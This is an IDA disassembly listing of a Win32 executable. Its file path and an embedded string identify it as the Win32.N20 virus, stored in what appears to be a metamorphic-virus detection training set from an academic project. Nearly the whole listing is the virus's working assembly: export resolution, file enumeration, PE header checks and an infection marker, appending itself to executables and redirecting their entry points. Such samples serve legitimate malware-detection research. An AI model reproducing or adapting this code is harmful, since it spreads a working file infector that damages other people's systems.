

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; º Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\N20.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00034000 ( 212992.)
; Section size in file		: 00034000 ( 212992.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


		public start
start		proc near		; DATA XREF: start+339CBo
		nop
		nop
		nop

		nop
		nop
		nop

loc_434875:				; DATA XREF: start+33B91r
		call	$+5

loc_43487A:				; DATA XREF: start+3387Bo
		pop	ebp
		sub	ebp, offset loc_43487A
		jmp	loc_434F56
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		db 8Bh,	0BDh
		dd offset dword_434EF3
		db 89h,	0BDh
		dd offset dword_4348A3
		db 8Bh,	95h
		dd offset dword_434E38
		db 89h,	95h
		dd offset dword_4348AB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_43489E:				; CODE XREF: start+33C67j
					; CODE:00434FF0j
		test	ebp, ebp
		jz	short loc_4348B1
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		db 0BBh
dword_4348A3	dd 0			; DATA XREF: start+3388Eo
					; CODE:00434F9Cw
		dd 0C381D233h
dword_4348AB	dd 0			; DATA XREF: start+3389Ao
					; CODE:00434FA8w
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		jmp	ebx
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4348B1:				; CODE XREF: start+338A0j
		push	0
		call	ExitProcess

loc_4348B8:				; CODE XREF: start+33C77p
		push	0
		push	0
		push	3
		push	0
		push	1
		mov	edx, 0C0000000h
		push	edx
		mov	edx, offset dword_434D12
		add	edx, ebp
		push	edx
		call	ss:dword_434F09[ebp]
		inc	eax
		jz	short loc_434942
		sub	eax, 1
		mov	ss:dword_434E2C[ebp], eax

loc_4348E2:				; CODE XREF: start+33AC1p
		push	ss:dword_434D06[ebp]
		pop	ecx
		dec	ebx
		push	ecx
		push	0
		add	ebx, ebx
		push	ecx
		push	0
		push	4
		push	0
		push	ss:dword_434E2C[ebp]
		call	ss:dword_434F19[ebp]
		mov	ss:dword_434F01[ebp], eax
		pop	ecx
		test	eax, eax
		jz	short loc_434936
		mov	eax, 0
		push	ecx
		push	eax
		push	eax
		push	2
		push	ss:dword_434F01[ebp]
		call	ss:dword_434F0D[ebp]
		test	eax, eax
		jz	short loc_434931
		mov	edx, eax
		mov	ss:dword_434E46[ebp], edx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434931:				; CODE XREF: start+33925j start+33CC6p
		call	loc_434944

loc_434936:				; CODE XREF: start+3390Bj
		push	ss:dword_434E2C[ebp]
		call	ss:dword_434F21[ebp]

loc_434942:				; CODE XREF: start+338D7j
		stc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434944:				; CODE XREF: start+33931p start+33AB1p
		push	ss:dword_434E46[ebp]
		call	ss:dword_434F05[ebp]
		push	ss:dword_434F01[ebp]
		call	ss:dword_434F21[ebp]
		xor	ebx, 5AD7B53h
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434963:				; CODE XREF: CODE:00434FBFp
		call	loc_4349A2
		mov	edx, ebp
		sub	ecx, eax
		add	edx, offset dword_434CE6
		push	edx
		xor	ecx, 1C04079h
		push	ebx
		call	ss:dword_434F11[ebp]
		mov	ss:dword_434EFD[ebp], eax
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434987:				; CODE XREF: CODE:00434FD7p
		call	loc_4349A2
		mov	ebx, offset dword_434CE6
		add	ebx, ebp
		push	ebx
		mov	eax, ss:dword_434EFD[ebp]
		push	eax
		call	ss:dword_434F1D[ebp]
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4349A2:				; CODE XREF: start+33963p start+33987p
		pusha
		lea	edx, dword_434D12[ebp]
		mov	ecx, 0
		add	ecx, 114h
		neg	eax

loc_4349B6:				; CODE XREF: start+339BBj
		mov	byte ptr [edx],	0
		inc	edx
		dec	ecx
		jnz	short loc_4349B6
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_4349BF	dd 0FFEE29BEh		; DATA XREF: start+33F8Cr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		inc	dword ptr [ecx+11D7C6h]
		add	[ebx], al
		mov	ch, 25h
		dec	edi
		inc	ebx
		add	[ecx+0], bh
		add	ecx, [esi+78h]
		add	ecx, ss:dword_434E3C[ebp]
		xor	ss:dword_434E52[ebp], ecx
		inc	ecx
		add	ecx, 1Bh
		mov	esi, [ecx]
		add	ecx, 4
		add	esi, ss:dword_434E3C[ebp]
		mov	ss:dword_434E30[ebp], esi
		mov	esi, [ecx]
		add	esi, ss:dword_434E3C[ebp]
		mov	ss:dword_434E4A[ebp], esi
		add	ecx, 4
		mov	esi, [ecx]
		add	esi, ss:dword_434E3C[ebp]
		mov	ss:dword_434EF9[ebp], esi
		push	8
		pop	edx
		lea	edi, dword_434E5A[ebp]
		mov	eax, ebp
		shr	ebx, 8
		add	eax, offset dword_434F05

loc_434A2B:				; CODE XREF: start+33A62j
		mov	ecx, edi

loc_434A2D:				; CODE XREF: start+33A33j
		add	ecx, 1
		cmp	byte ptr [ecx],	0
		jnz	short loc_434A2D
		shl	ebx, 8
		sub	ecx, edi
		mov	ss:word_434EF7[ebp], 0
		call	loc_434BBC
		push	edi
		add	[esp], ecx
		pop	edi
		sub	edi, 0FFFFFFFFh
		mov	ebx, ss:dword_434CDE[ebp]
		mov	[eax], ebx
		add	eax, 4
		add	ss:dword_434E52[ebp], eax
		dec	edx
		jnz	short loc_434A2B
		jmp	loc_434F96
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434A69:				; CODE XREF: start+33CBDp
		mov	edi, ss:dword_434E46[ebp]
		mov	esi, [edi+3Ch]
		add	esi, edi
		add	esi, 3Ch
		mov	ecx, [esi]
		sub	esi, 3Ch
		push	ss:dword_434D06[ebp]
		pop	ebx
		add	ebx, 780h
		mov	ss:dword_434CD6[ebp], ebx
		mov	ss:dword_434CE2[ebp], ecx
		call	loc_434F29
		and	ss:dword_434E52[ebp], 264705h
		mov	ebx, ss:dword_434CD6[ebp]
		mov	ss:dword_434E4E[ebp], ebx
		pusha
		call	loc_434944
		popa
		ror	edx, 0Ch
		push	ebx
		pop	ss:dword_434D06[ebp]
		call	loc_4348E2
		jb	loc_434BBA
		mov	esi, ss:dword_434E46[ebp]
		mov	eax, esi
		add	eax, [esi+3Ch]
		mov	esi, 0
		add	esi, eax
		movzx	ecx, word ptr [esi+6]
		mov	ebx, 0
		add	ebx, 1
		sub	ecx, ebx
		imul	ecx, 28h
		add	eax, ecx
		add	eax, 78h
		xor	edx, edx
		add	edx, [esi+74h]
		clc
		rcl	edx, 3
		add	eax, edx
		sbb	ebx, 0Dh
		mov	edx, [esi+34h]
		mov	ss:dword_434EF3[ebp], edx
		mov	ecx, [esi+28h]
		mov	ss:dword_434E38[ebp], ecx
		mov	ecx, [eax+10h]
		and	edx, 0
		add	edx, ecx
		sub	ss:dword_434E52[ebp], ebx
		add	ecx, [eax+14h]
		push	ecx
		push	edx
		pop	ebx
		add	ebx, [eax+0Ch]
		mov	[esi+28h], ebx
		mov	ss:dword_434CD2[ebp], ebx
		mov	ebx, [eax+10h]
		push	ebx
		push	dword ptr [esi+3Ch]
		add	ebx, 780h
		pop	ss:dword_434CE2[ebp]
		mov	ss:dword_434CD6[ebp], ebx
		call	loc_434F29
		mov	ebx, ss:dword_434CD6[ebp]
		mov	dword ptr [eax+10h], 0
		add	[eax+10h], ebx
		pop	ebx
		add	ebx, 398h
		add	ebx, 3E8h
		mov	[eax+8], ebx
		mov	ebx, [eax+0Ch]
		add	ebx, [eax+10h]
		mov	[esi+50h], ebx
		or	dword ptr [eax+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 0
		add	dword ptr [esi+4Ch], 4E3230h
		pop	edi
		lea	esi, loc_434875[ebp]
		add	edi, ss:dword_434E46[ebp]
		mov	edx, 780h

loc_434BA2:				; CODE XREF: start+33BA4j
		movsb
		dec	edx
		jnz	short loc_434BA2
		push	0
		pop	edx
		add	edx, ss:dword_434E56[ebp]
		add	edx, 0FFFFFFFFh
		mov	ss:dword_434E56[ebp], edx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434BBA:				; CODE XREF: start+33AC6j
		stc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434BBC:				; CODE XREF: start+33A43p
		pusha
		mov	eax, ss:dword_434E4A[ebp]

loc_434BC3:				; CODE XREF: start+33C2Aj
		push	eax
		mov	edx, [eax]
		shl	ebx, 12h
		add	edx, ss:dword_434E3C[ebp]
		and	eax, 0
		add	eax, edx
		mov	ebx, eax
		mov	ss:dword_434CDA[ebp], ecx
		mov	ss:dword_434EEF[ebp], ebx
		mov	ss:dword_434E34[ebp], edi
		cld

loc_434BE9:				; CODE XREF: start+33BFFj
		mov	dl, [ebx]
		cmp	dl, [edi]
		jnz	short loc_434C01
		mov	edx, ebx
		add	ecx, 0FFFFFFFFh
		cmp	ecx, 0
		jz	short loc_434C2C
		inc	ebx
		neg	edx
		add	edi, 1
		jmp	short loc_434BE9
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434C01:				; CODE XREF: start+33BEDj
		mov	edi, ss:dword_434E34[ebp]
		mov	ebx, ss:dword_434EEF[ebp]
		mov	ecx, ss:dword_434CDA[ebp]
		pop	eax
		add	eax, 4
		add	ss:word_434EF7[ebp], 1
		cmp	ss:word_434EF7[ebp], 2002h
		jz	short loc_434C65
		jmp	short loc_434BC3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434C2C:				; CODE XREF: start+33BF7j
		add	esp, 4
		xor	ebx, ebx
		mov	bx, ss:word_434EF7[ebp]
		shl	ebx, 1
		xor	edx, edx
		add	ebx, ss:dword_434EF9[ebp]
		mov	esi, ebx
		xor	ebx, ebx
		mov	bx, [esi]
		clc
		rcl	ebx, 2
		add	ebx, ss:dword_434E30[ebp]
		mov	edx, [ebx]
		add	edx, ss:dword_434E3C[ebp]
		or	eax, edx
		mov	ss:dword_434CDE[ebp], edx
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434C65:				; CODE XREF: start+33C28j
		pop	eax
		popa
		jmp	loc_43489E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434C6C:				; CODE XREF: CODE:00434FC7p
		lea	eax, dword_434D02[ebp]
		cmp	dword ptr [eax], 0
		jnz	short locret_434CCB
		call	loc_4348B8
		jb	short locret_434CCB
		neg	eax
		push	ss:dword_434E46[ebp]
		pop	edi
		shr	ecx, 0Fh
		cmp	word ptr [edi],	5A4Dh
		jz	short loc_434C93
		jmp	short loc_434CC6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434C93:				; CODE XREF: start+33C8Fj
		cmp	word ptr [edi+3Ch], 0
		jz	short loc_434CC6
		xor	esi, esi
		add	esi, [edi+3Ch]
		cmp	ss:dword_434D06[ebp], esi
		jb	short loc_434CC6
		add	esi, edi
		cmp	word ptr [esi],	4550h
		jz	short loc_434CB2
		jmp	short loc_434CC6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434CB2:				; CODE XREF: start+33CAEj
		cmp	dword ptr [esi+4Ch], 4E3230h
		jnz	short loc_434CBD
		jmp	short loc_434CC6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434CBD:				; CODE XREF: start+33CB9j
		call	loc_434A69
		jnb	short loc_434CC6
		jmp	short locret_434CCB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434CC6:				; CODE XREF: start+33C91j start+33C98j ...
		call	loc_434931

locret_434CCB:				; CODE XREF: start+33C75j start+33C7Cj ...
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		dd 1CBEE381h
		db 0E9h, 0
dword_434CD2	dd 0			; DATA XREF: start+33B2Ew
dword_434CD6	dd 0			; DATA XREF: start+33A89w start+33AA4r ...
dword_434CDA	dd 0			; DATA XREF: start+33BD6w start+33C0Dr
dword_434CDE	dd 0			; DATA XREF: start+33A50r start+33C5Dw
dword_434CE2	dd 0			; DATA XREF: start+33A8Fw start+33B41w ...
dword_434CE6	dd 7 dup(0)		; DATA XREF: start+3396Co start+3398Co
dword_434D02	dd 0			; DATA XREF: start+33C6Cr
dword_434D06	dd 0			; DATA XREF: start+338E2r start+33A7Cr ...
		dd 2 dup(0)
dword_434D12	dd 0			; DATA XREF: start+338C8o start+339A3r
		dd 45h dup(0)
		align 4
dword_434E2C	dd 0			; DATA XREF: start+338DCw start+338F6r ...
dword_434E30	dd 0			; DATA XREF: start+339F3w start+33C4Dr
dword_434E34	dd 0			; DATA XREF: start+33BE2w start+33C01r
dword_434E38	dd 0			; DATA XREF: start+33894o start+33B0Ew ...
dword_434E3C	dd 0			; DATA XREF: start+339D8r start+339EDr ...
dword_434E40	dd 78452E2Ah		; DATA XREF: CODE:00434FB8o
		db 45h,	0
dword_434E46	dd 0			; DATA XREF: start+33929w start+33944r ...
dword_434E4A	dd 0			; DATA XREF: start+33A01w start+33BBDr
dword_434E4E	dd 0			; DATA XREF: start+33AAAw
dword_434E52	dd 0			; DATA XREF: start+339DEw start+33A5Bw ...
dword_434E56	dd 0			; DATA XREF: start+33BA9r start+33BB2w ...
dword_434E5A	dd 616D6E55h		; DATA XREF: start+33A1Br
aPviewoffile	db 'pViewOfFile',0
aCreatefilea	db 'CreateFileA',0
aMapviewoffile	db 'MapViewOfFile',0
aFindfirstfilea	db 'FindFirstFileA',0
aFindclose	db 'FindClose',0
aCreatefilemapp	db 'CreateFileMappingA',0
aFindnextfilea	db 'FindNextFileA',0
aClosehandle	db 'CloseHandle',0
aVirusWin32_n20	db 'Virus : Win32.N20 Author : SnakeByte',0
dword_434EEF	dd 0			; DATA XREF: start+33BDCw start+33C07r
dword_434EF3	dd 0			; DATA XREF: start+33888o start+33B05w ...
word_434EF7	dw 0			; DATA XREF: start+33A3Aw start+33C17w ...
dword_434EF9	dd 0			; DATA XREF: start+33A12w start+33C3Cr
dword_434EFD	dd 0			; DATA XREF: start+33980w start+33994r ...
dword_434F01	dd 0			; DATA XREF: start+33902w start+33917r ...
dword_434F05	dd 0			; DATA XREF: start+3394Ar start+33A26o
dword_434F09	dd 0			; DATA XREF: start+338D0r
dword_434F0D	dd 0			; DATA XREF: start+3391Dr
dword_434F11	dd 0			; DATA XREF: start+3397Ar
dword_434F15	dd 0			; DATA XREF: CODE:00434FEAr
dword_434F19	dd 0			; DATA XREF: start+338FCr
dword_434F1D	dd 0			; DATA XREF: start+3399Br
dword_434F21	dd 0			; DATA XREF: start+3393Cr start+33956r
dword_434F25	dd 0			; DATA XREF: start+33F80w
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434F29:				; CODE XREF: start+33A95p start+33B4Dp
		pusha
		mov	eax, ss:dword_434CD6[ebp]
		xor	edx, edx
		mov	ebx, ss:dword_434CE2[ebp]
		push	eax
		div	ebx
		inc	ecx
		sub	ebx, edx
		pop	eax
		add	eax, ebx
		mov	ss:dword_434CD6[ebp], 0
		sbb	ecx, 1
		add	ss:dword_434CD6[ebp], eax
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434F56:				; CODE XREF: start+33881j
		mov	edx, [esp+0]
		sub	dx, dx

loc_434F5C:				; CODE XREF: start+33F6Dj start+33F73j
		mov	ebx, 0
		sub	edx, 1
		mov	bx, [edx+3Ch]
		cmp	bx, 0F800h
		jz	short loc_434F5C
		cmp	edx, [edx+ebx+34h]
		jnz	short loc_434F5C
		mov	ss:dword_434E3C[ebp], edx
		mov	eax, edx
		add	eax, [edx+3Ch]
		mov	ss:dword_434F25[ebp], eax
		xor	ebx, 2CF5EC1h
		lea	eax, dword_4349BF[ebp]
		or	ebx, ecx
		push	eax
		retn
start		endp ; sp = -4

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_434F96:				; CODE XREF: start+33A64j
		mov	edi, ss:dword_434EF3[ebp]
		mov	ss:dword_4348A3[ebp], edi
		mov	edi, ss:dword_434E38[ebp]
		mov	ss:dword_4348AB[ebp], edi
		mov	ss:dword_434E56[ebp], 14h
		mov	ebx, offset dword_434E40
		add	ebx, ebp
		call	loc_434963
		inc	eax
		jz	short loc_434FE1

loc_434FC7:				; CODE XREF: CODE:00434FDFj
		call	loc_434C6C
		mov	ecx, ss:dword_434E56[ebp]
		cmp	ecx, 0
		jz	short loc_434FE1
		call	loc_434987
		cmp	eax, 0
		jnz	short loc_434FC7

loc_434FE1:				; CODE XREF: CODE:00434FC5j
					; CODE:00434FD5j
		push	ss:dword_434EFD[ebp]
		shl	eax, 0Dh
		call	ss:dword_434F15[ebp]
		jmp	loc_43489E
; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		align 8
CODE		ends

; Section 2. (virtual address 00035000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00034600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 435000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 00036000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00034600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
